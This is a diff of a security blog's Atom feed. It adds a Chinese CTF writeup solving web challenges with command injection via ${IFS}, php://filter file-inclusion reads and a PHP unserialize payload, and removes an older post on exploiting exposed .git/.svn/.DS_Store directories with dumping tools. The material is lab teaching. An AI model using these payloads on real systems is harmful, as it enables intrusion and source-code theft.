@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-12-02T13:50:40.132Z</updated>
+  <updated>2017-12-09T03:43:15.059Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,80 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>month 1 for cnas writeup</title>
+    <link href="http://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html"/>
+    <id>http://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html</id>
+    <published>2017-12-09T02:51:07.000Z</published>
+    <updated>2017-12-09T03:43:15.059Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="签到-50"><a href="#签到-50" class="headerlink" title="签到 50"></a>签到 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="external">http://47.100.121.220:28001</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的题目，进入页面可以在相应头中找到flag。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%93%8D%E5%BA%94%E5%A4%B4.png" alt=""></p>
+<h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="external">http://47.100.121.220:28002</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这里的提示是 爬虫什么的，最讨厌了！  所以应该是在说robots.txt文件</p>
+<p>另外如果不能想到这个，对于我这种脚本小子。拿到题就是用御剑扫起来。</p>
+<p>这里我们可以看到一个图片 Disallow: /2333.png</p>
+<p>下载之，这里应该是一个隐身之类的，这里就不用bindwalk跑图片了，直接丢进WinHex下，搜索flag</p>
+<p>存在flag.pyc文件，</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/pyc.png" alt=""></p>
+<p>应该是一个解压包，把.png改成.zip,解压得到flag.pyc</p>
+<p>pyc在线反编译，得到python代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># encoding: utf-8</div><div class="line"># 访问 http://tool.lu/pyc/ 查看更多信息</div><div class="line">print &apos;show me flag&apos;</div><div class="line">a = [</div><div class="line">    4567249,</div><div class="line">    4567259,</div><div class="line">    4567254,</div><div class="line">    4567248,</div><div class="line">    4567244,</div><div class="line">    4567169,</div><div class="line">    4567183,</div><div class="line">    4567252,</div><div class="line">    4567175,</div><div class="line">    4567171,</div><div class="line">    4567250,</div><div class="line">    4567169,</div><div class="line">    4567174,</div><div class="line">    4567170,</div><div class="line">    4567183,</div><div class="line">    4567253,</div><div class="line">    4567183,</div><div class="line">    4567183,</div><div class="line">    4567182,</div><div class="line">    4567250,</div><div class="line">    4567170,</div><div class="line">    4567168,</div><div class="line">    4567252,</div><div class="line">    4567170,</div><div class="line">    4567173,</div><div class="line">    4567172,</div><div class="line">    4567183,</div><div class="line">    4567172,</div><div class="line">    4567252,</div><div class="line">    4567171,</div><div class="line">    4567251,</div><div class="line">    4567169,</div><div class="line">    4567182,</div><div class="line">    4567173,</div><div class="line">    4567168,</div><div class="line">    4567183,</div><div class="line">    4567175,</div><div class="line">    4567183,</div><div class="line">    4567173,</div><div class="line">    4567174,</div><div class="line">    4567183,</div><div class="line">    4567251,</div><div class="line">    4567249,</div><div class="line">    4567170,</div><div class="line">    4567251,</div><div class="line">    4567242]</div><div class="line">flag = &apos;&apos;</div><div class="line">for _ in a:</div><div class="line">    flag += chr(_ ^ 4567223)</div></pre></td></tr></table></figure>
+<p>加个输出 print flag </p>
+<p>跑一下，得到flag</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/flagpyc.png" alt=""></p>
+<h2 id="ping-100"><a href="#ping-100" class="headerlink" title="ping 100"></a>ping 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005/" target="_blank" rel="external">http://47.100.121.220:28005/</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>拿到题目应该可以看得出来这是一个命令执行的题目。</p>
+<p>这里在提交框填什么都会重定向到05.php?ip=127.0.0.1</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E9%87%8D%E5%AE%9A%E5%90%91.png" alt=""></p>
+<p>关键在重定向后的这个数据包，这里我们就可以命令执行了</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/pingls.png" alt=""></p>
+<p>这里不能直接利用cat flag.php 应该是过滤了空格</p>
+<p>这里我们利用 \${IFS} 绕过 得到flag</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/IFS.png" alt=""></p>
+<h2 id="06-100"><a href="#06-100" class="headerlink" title="06 100"></a>06 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006/06.php" target="_blank" rel="external">http://47.100.121.220:28006/06.php</a></p>
+<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">show_source(__FILE__);</div><div class="line">include($_GET[&apos;file&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这里我们可以看出这是一个文件包含的题目，在服务器应该存在一个flag.php文件</p>
+<p>试图访问/flag.php是存在的，状态为200。</p>
+<p>这样我们就可以利用文件包含来读flag.php的代码了</p>
+<p>这里直接包含是不行的，要利用php的伪协议 php://filter 来读取</p>
+<p>php伪协议可以参考我的博客</p>
+<p><a href="http://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
+<p>直接用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</div></pre></td></tr></table></figure>
+<p>就可以得到base64加密的flag.php源码了,直接解密，得到flag</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/0606060606606.png" alt=""></p>
+<h2 id="07-100"><a href="#07-100" class="headerlink" title="07 100"></a>07 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28007/" target="_blank" rel="external">http://47.100.121.220:28007/</a></p>
+<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>打开链接 直接得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include(&apos;flag.php&apos;);</div><div class="line"></div><div class="line">class A &#123;</div><div class="line">    var $guess;</div><div class="line">    var $flag;</div><div class="line">&#125;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line">if (isset($_GET[&apos;k&apos;])) &#123;</div><div class="line">    $k = $_GET[&apos;k&apos;];</div><div class="line"></div><div class="line">    $o = unserialize($k);</div><div class="line"></div><div class="line">    if ($o) &#123;</div><div class="line">        $o-&gt;flag = $flag;</div><div class="line">        if ($o-&gt;flag === $o-&gt;guess) &#123;</div><div class="line">            echo &quot;Congratulation! &quot;.$o-&gt;flag;</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            echo &quot;wrong!!&quot;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        echo &quot;wrong!&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>对源码进行分析，可以知道这是一个反序列化的题目，关键的判断在如下代码部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$o-&gt;flag = $flag;</div><div class="line">      if ($o-&gt;flag === $o-&gt;guess) &#123;</div><div class="line">          echo &quot;Congratulation! &quot;.$o-&gt;flag;</div><div class="line">      &#125;</div><div class="line">      else &#123;</div><div class="line">          echo &quot;wrong!!&quot;;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
+<p>从代码的理解我们需要做到对象里的flag成员变量的值等于guess的成员变量的值</p>
+<p>即 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$o-&gt;flag === $o-&gt;guess</div></pre></td></tr></table></figure>
+<p>这里我们可以写一个1.php的序列化文件，使我们的类和对象符合题目中的条件，</p>
+<p>再利用serialize()函数 序列化得到payload,再把payload赋值给k，由此得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">class A &#123;</div><div class="line">    var $flag;</div><div class="line">    var $guess;</div><div class="line">    function A()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;flag=&amp;$this-&gt;guess;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">echo serialize(new A());</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/serializetest.png" alt=""></p>
+<p>得到paylad</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:5:&quot;guess&quot;;R:2;&#125;</div></pre></td></tr></table></figure>
+<p>赋值给k,得到flag</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/unserializectf.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>week 3 for cnas writeup</title>
@@ -940,7 +1014,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#x66;&#x6f;&#x6f;&#x40;&#x62;&#97;&#114;&#46;&#99;&#111;&#109;">&#x66;&#x6f;&#x6f;&#x40;&#x62;&#97;&#114;&#46;&#99;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#x66;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#x2e;&#x63;&#x6f;&#109;">&#x66;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#x2e;&#x63;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
@@ -2368,75 +2442,6 @@
     </summary>
     
       <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>常见Web源码泄露总结</title>
-    <link href="http://uknowsec.cn/posts/ctf/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93.html"/>
-    <id>http://uknowsec.cn/posts/ctf/常见Web源码泄露总结.html</id>
-    <published>2017-07-14T01:49:47.000Z</published>
-    <updated>2017-07-14T02:00:20.346Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p>
-<h2 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h2><h3 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h3><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>hg init的时候会生成.hg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
-<h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-hg.pl -v -u http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
-<h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h4 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g. http://www.example.com/.git/config</div></pre></td></tr></table></figure></p>
-<h4 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
-<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack.py http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
-<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-git.pl -v -u http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
-<h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h4><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.example.com/.ds_store</div></pre></td></tr></table></figure>
-<p>注意路径检查</p>
-<p>工具：</p>
-<p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">dsstoreexp</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ds_store_exp.py http://www.example.com/.DS_Store</div></pre></td></tr></table></figure></p>
-<h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
-<h4 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害:"></a>漏洞成因及危害:</h4><p>该漏洞的成因主要有以下两种：</p>
-<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
-<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测:"></a>漏洞检测:</h4><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure></p>
-<h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
-<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</div></pre></td></tr></table></figure>
-<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><p>工具：</p>
-<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-svn.pl -v -u http://www.example.com/.svn/</div></pre></td></tr></table></figure>
-<p>Seay-Svn</p>
-<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
-<p>WEB-INF主要包含一下文件或目录：</p>
-<ul>
-<li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
-<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
-<li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
-<li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li>
-<li>/WEB-INF/database.properties：数据库配置文件<h4 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4></li>
-</ul>
-<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
-<p>漏洞检测以及利用方法：</p>
-<p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。<br>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
-<h3 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>测试的目录</p>
-<ul>
-<li><a href="http://url/CVS/Root" target="_blank" rel="external">http://url/CVS/Root</a> 返回根信息</li>
-<li><a href="http://url/CVS/Entries" target="_blank" rel="external">http://url/CVS/Entries</a> 返回所有文件的结构<br>取回源码的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk clone http://url/name dir</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
-<p>查看所有的改变的命令，转到download的目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bk changes</div><div class="line">Bazaar/bzr</div></pre></td></tr></table></figure></p>
-<p>工具：</p>
-<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</div></pre></td></tr></table></figure></p>
-<p>工具推荐</p>
-<p>Bitkeeper<br>weakfilescan</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21296806</a><br><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="external">http://www.s2.sshz.org/post/source-code-leak/</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
     
     
   </entry>
